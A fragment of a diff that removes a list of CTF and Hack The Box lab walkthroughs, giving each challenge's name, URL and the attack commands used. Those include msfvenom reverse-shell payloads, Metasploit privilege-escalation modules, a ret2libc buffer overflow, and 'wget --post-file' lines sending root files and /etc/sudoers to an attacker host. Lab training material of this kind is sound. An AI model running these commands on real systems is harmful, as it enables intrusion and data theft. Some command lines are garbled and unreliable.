 nmap -p- -Pn 192.168.1.112
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-bounty
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-bounty/
-
-nmap -sC -sV -oA Bounty 10.10.10.93
-python -m SimpleHTTPServer 80
-nc -nlvp 4444
-attrib *.* -h -s /s/d
-type user.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-sense
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-sense/
-
-nmap -sC -sV -oA Sense 10.10.10.60
-gobuster -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
-gobuster -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -s 200 -x php,txt,jpg,jpeg,gif
-http://10.10.10.60/changelog.txt
-nc -nlvp 1234
-python3 exploit.py –rhost 10.10.10.60 –lhost <attacker ip> –lport 1234 –username rohit –password pfsense
-cd /home/rohit
-cat user.txt
-cd /root
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-sunday
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-sunday/
-
-nmap -sC -sV -oA Sunday 10.10.10.76
-nmap -sC -sV -p 22022 10.10.10.76
-finger @10.10.10.76
-finger sunny@10.10.10.76
-finger sammy@10.10.10.76
-sudo -l
-sudo /root/troll
-ls -la
-ssh sammy@10.10.10.76 -p 22022
-sudo -l
-sudo wget –post-file=/root/root.txt <attacker machine
-sudo wget –post-file=/etc/sudoers <attacker machine ip
-sudo wget -O /etc/sudoers http://<attcker_ip:8000/sudoers
-sudo su
 
 
 
@@ -2493,44 +1606,6 @@ chmod +x exploit
 
 
 
-Challenge Name: hack-the-box-walkthrough-devel
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-walkthrough-devel/
-
-nmap -sC -sV -oA Devel 10.10.10.5
-ftp 10.10.10.5
-anonymous
-put test.txt
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=1234 -f aspx -o shell.aspx
-put shell.aspx
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST <ip for HTB vpn lab
-set LPORT 1234
-exploit
-getuid
-shell
-systeminfo
-background
-use post/multi/recon/local_exploit_suggester
-use exploit/windows/local/ms10_015_kitrap0d
-options
-set sessions 1
-options
-exploit
-options
-sessions -l
-options
-set LHOST <machine ip for HTB VPN
-set LPORT 4321
-run
-sessions -l
-sessions 3
-cd Desktop
-ls
-cat root.txt.txt
-
-
-
 Challenge Name: typhoon-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/typhoon-ctf-walkthrough/
 
@@ -2548,88 +1623,6 @@ id
 python –c ‘import pty; pty.spawn(“/bin/sh”)’
 uname –a
 cat /etc/issue
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-grandpa
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-grandpa/
-
-nmap -sC -sV -oA grandpa 10.10.10.14
-python exploit.py 10.10.10.14 80 <attacking machine ip> 80
-python windows-exploit-suggester.py –update
-python windows-exploit-suggester.py –database 2018-12-29-mssb.xlsx –systeminfo system.txt
-cadaver http://10.10.10.14/dav
-dir
-python -m pyftpdlib -p 21
-echo open 10.10.14.6>ftp_commands.txt&echo anonymous
-use exploit/windows/iis/iis_webdav_scstoragepathfromurl
-options
-set RHOST 10.10.10.14
-set LHOST <attacking machine ip>
-set LPORT 1234
-exploit
-use exploits/windows/local/ms15_051_client_copy_image
-options
-set SESSION 1
-set payload windows/meterpreter/reverse_tcp
-set LHOST <attacking machine ip>
-set LPORT 4422
-exploit
-sessions -1
-getuid
-migrate 1804
-getuid
-options
-exploit
-getuid
-shell
-cd “Documents and Settings/Harry/Desktop”
-type user.txt
-cd “Documents and Settings/Administrator/Desktop”
-type root.txt
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-october
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-october/
-
-nmap -sC -sV october 10.10.10.16
-searchsploit october
-nc -nlvp 1234
-cd /home/harry/desktop
-cat user.txt
-uname -a
-find / -perm 4000 2>dev/null
-file /usr/local/bin/ovrflw
-./ovrflw
-nc <attacking machine ip> < ovrflw
-file overflw
-./pattern_create.rb -l 200
-gdb ovrflw
-r <pattern created from above
-./pattern_offset.rb -q 64413764
-gdb ovrflw
-r `python -c ‘print “A”*112 + “B”*4 + “C”*84’`
-readelf -l overflw
-cat /proc/sys/kernel/randomize_va_space
-ldd ./overflw | grep libc
-readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
-readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
-strings -a -t -x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
-while trur;do ./overflw $(python -c `print “A”*112+<address of system><address if exit ><address of /bin/sh
-ldd ./ovrflw | grep libc
-readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
-readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
-strings -a -t -x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
-while true; do ./ovrflw $(python -c ‘print “A”*112 + “x10x93x5BxB7x60xC2x4AxB7xACxBBx6DxB7″‘);done
-cd /root
-cat root.txt
-
-
-
-Challenge Name: vulnhub-machines-walkthrough-series-mr-robot
-Challenge URL: https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-mr-robot/
-
 
 
 
@@ -2673,33 +1666,6 @@ Challenge URL: https://resources.infosecinstitute.com/topic/golden-eye-1-ctf-wal
 
 
 
-Challenge Name: vulnhub-machines-walkthrough-series-skytower
-Challenge URL: https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-skytower/
-
-netdiscover -r 192.168.213.0/24
-nmap -p- -sV -A 192.168.213.141
-vi etc /proxychains.conf
-http 192.168.213.141 3128
-cd /var/www
-ls
-cat login.php
-sudo ls /accounts/../root
-sudo cat /accounts/../flag.txt
-
-
-
-Challenge Name: vulnhub-machines-walkthrough-series-vulnosv2
-Challenge URL: https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-vulnosv2/
-
-netdiscover -r 192.168.0.0/24
-nmap -sC -sV 192.168.213.142
-ssh webmin@192.168.213.142
-uname -a
-wget http://192.168.213.131/37292.c
-./root
-
-
-
 Challenge Name: goldeneye-1-ctf-walkthrough-part-1
 Challenge URL: https://resources.infosecinstitute.com/topic/goldeneye-1-ctf-walkthrough-part-1/
 
@@ -2708,12 +1674,6 @@ Challenge URL: https://resources.infosecinstitute.com/topic/goldeneye-1-ctf-walk
 
 Challenge Name: wakanda1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/wakanda1-ctf-walkthrough/
-
-
-
-
-Challenge Name: drunk-admin-web-hacking-challenge
-Challenge URL: https://resources.infosecinstitute.com/topic/drunk-admin-web-hacking-challenge/
 
 
 
@@ -2760,18 +1720,6 @@ Challenge URL: https://resources.infosecinstitute.com/topic/usv-2017-part-2-ctf-
 
 
 
-Challenge Name: vulnhub-machines-walkthrough-series-pwnlab-init
-Challenge URL: https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-pwnlab-init/
-
-
-
-
-Challenge Name: kioptrix-vms-challenge-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/kioptrix-vms-challenge-walkthrough/
-
-
-
-
 Challenge Name: usv-2017-part-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/usv-2017-part-1-ctf-walkthrough/
 
@@ -2784,12 +1732,6 @@ Challenge URL: https://resources.infosecinstitute.com/topic/6-days-lab-1-1-ctf-w
 
 
 
-Challenge Name: tools-of-trade-and-resources-to-prepare-in-a-hacker-ctf-competition-or-challenge
-Challenge URL: https://resources.infosecinstitute.com/topic/tools-of-trade-and-resources-to-prepare-in-a-hacker-ctf-competition-or-challenge/
-
-
-
-
 Challenge Name: bulldog-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/bulldog-1-ctf-walkthrough/
 
@@ -2798,12 +1740,6 @@ Challenge URL: https://resources.infosecinstitute.com/topic/bulldog-1-ctf-walkth
 
 Challenge Name: zico-2-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/zico-2-1-ctf-walkthrough/
-
-
-
-
-Challenge Name: mobile-ctf-challenge-contest-details-win-1000
-Challenge URL: https://resources.infosecinstitute.com/topic/mobile-ctf-challenge-contest-details-win-1000/
 
 
 
@@ -2844,12 +1780,6 @@ Challenge URL: https://resources.infosecinstitute.com/topic/ew-skuzzy-ctf-walkth
 
 
 
-Challenge Name: troll-2-exploitation-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/troll-2-exploitation-walkthrough/
-
-
-
-
 Challenge Name: pluck-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/pluck-1-ctf-walkthrough/
 
@@ -2868,38 +1798,8 @@ Challenge URL: https://resources.infosecinstitute.com/topic/super-mario-ctf-walk
 
 
 
-Challenge Name: metasploitable-2-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/metasploitable-2-walkthrough/
-
-
-
-
-Challenge Name: nullbyte-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/nullbyte-walkthrough/
-
-
-
-
 Challenge Name: billubox-ctf-walkthrough-2
 Challenge URL: https://resources.infosecinstitute.com/topic/billubox-ctf-walkthrough-2/
-
-
-
-
-Challenge Name: metasploitable-1-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/metasploitable-1-walkthrough/
-
-
-
-
-Challenge Name: moria-1-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/moria-1-walkthrough/
-
-
-
-
-Challenge Name: sickos-1-2-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/sickos-1-2-walkthrough/
 
 
 
@@ -2924,174 +1824,6 @@ Challenge URL: https://resources.infosecinstitute.com/topic/minotaur-ctf-walkthr
 
 Challenge Name: hackerfest-quaoar-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/hackerfest-quaoar-ctf-walkthrough/
-
-
-
-
-Challenge Name: hacking-imf-ctf
-Challenge URL: https://resources.infosecinstitute.com/topic/hacking-imf-ctf/
-
-
-
-
-Challenge Name: breaking-fortress-dc416-ctf
-Challenge URL: https://resources.infosecinstitute.com/topic/breaking-fortress-dc416-ctf/
-
-
-
-
-Challenge Name: fuku-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/fuku-walkthrough/
-
-
-
-
-Challenge Name: usv-ctf
-Challenge URL: https://resources.infosecinstitute.com/topic/usv-ctf/
-
-
-
-
-Challenge Name: stapler-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/stapler-walkthrough/
-
-
-
-
-Challenge Name: skydog-con-ctf-catch-me-if-you-can
-Challenge URL: https://resources.infosecinstitute.com/topic/skydog-con-ctf-catch-me-if-you-can/
-
-
-
-
-Challenge Name: seattle-vm-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/seattle-vm-walkthrough/
-
-
-
-
-Challenge Name: pwn-the-pwnlab
-Challenge URL: https://resources.infosecinstitute.com/topic/pwn-the-pwnlab/
-
-
-
-
-Challenge Name: penetration-testing-resources-ctfs-and-contests
-Challenge URL: https://resources.infosecinstitute.com/topic/penetration-testing-resources-ctfs-and-contests/
-
-
-
-
-Challenge Name: mr-robot-challenge
-Challenge URL: https://resources.infosecinstitute.com/topic/mr-robot-challenge/
-
-
-
-
-Challenge Name: what-a-challenger-perceives-in-most-of-the-ctf-categories-or-challenges
-Challenge URL: https://resources.infosecinstitute.com/topic/what-a-challenger-perceives-in-most-of-the-ctf-categories-or-challenges/
-
-
-
-
-Challenge Name: spydersec-challenge
-Challenge URL: https://resources.infosecinstitute.com/topic/spydersec-challenge/
-
-
-
-
-Challenge Name: ctf-2-practical-web-hacking-winners
-Challenge URL: https://resources.infosecinstitute.com/topic/ctf-2-practical-web-hacking-winners/
-
-
-
-
-Challenge Name: n00bz-ctf-challenge-2-practical-website-hacking
-Challenge URL: https://resources.infosecinstitute.com/topic/n00bz-ctf-challenge-2-practical-website-hacking/
-
-
-
-
-Challenge Name: the-pitfalls-of-client-side-authentication-solutions-to-net-force-javascript-ctf-challenges
-Challenge URL: https://resources.infosecinstitute.com/topic/the-pitfalls-of-client-side-authentication-solutions-to-net-force-javascript-ctf-challenges/
-
-
-
-
-Challenge Name: defeating-conundrums-solutions-to-net-force-internet-ctf-challenges
-Challenge URL: https://resources.infosecinstitute.com/topic/defeating-conundrums-solutions-to-net-force-internet-ctf-challenges/
-
-
-
-
-Challenge Name: defeating-cryptography-solutions-to-net-force-ctf-challenges-using-practical-cryptanalysis
-Challenge URL: https://resources.infosecinstitute.com/topic/defeating-cryptography-solutions-to-net-force-ctf-challenges-using-practical-cryptanalysis/
-
-
-
-
-Challenge Name: defeating-steganography-solutions-to-net-force-ctf-challenges-using-practical-steganalysis
-Challenge URL: https://resources.infosecinstitute.com/topic/defeating-steganography-solutions-to-net-force-ctf-challenges-using-practical-steganalysis/
-
-
-
-
-Challenge Name: n00bs-ctf-labs-solutions
-Challenge URL: https://resources.infosecinstitute.com/topic/n00bs-ctf-labs-solutions/
-
-
-
-
-Challenge Name: n00bs-ctf-labs-infosec-institute
-Challenge URL: https://resources.infosecinstitute.com/topic/n00bs-ctf-labs-infosec-institute/
-
-
-
-
-Challenge Name: sharkfest-2013-part-ii
-Challenge URL: https://resources.infosecinstitute.com/topic/sharkfest-2013-part-ii/
-
-
-
-
-Challenge Name: sharkfest-2013
-Challenge URL: https://resources.infosecinstitute.com/topic/sharkfest-2013/
-
-
-
-
-Challenge Name: flick-challenge
-Challenge URL: https://resources.infosecinstitute.com/topic/flick-challenge/
-
-
-
-
-Challenge Name: troll-challenge
-Challenge URL: https://resources.infosecinstitute.com/topic/troll-challenge/
-
-
-
-
-Challenge Name: secos-challenge
-Challenge URL: https://resources.infosecinstitute.com/topic/secos-challenge/
-
-
-
-
-Challenge Name: murdering-dexter
-Challenge URL: https://resources.infosecinstitute.com/topic/murdering-dexter/
-
-
-
-
-Challenge Name: xerxes-challenge
-Challenge URL: https://resources.infosecinstitute.com/topic/xerxes-challenge/
-
-
-
-
-Challenge Name: r00t-box
-Challenge URL: https://resources.infosecinstitute.com/topic/r00t-box/
 
 
 
